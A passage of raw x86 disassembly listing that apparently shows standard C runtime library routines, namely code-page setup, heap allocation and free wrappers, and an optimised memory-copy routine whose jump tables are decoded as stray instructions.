  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
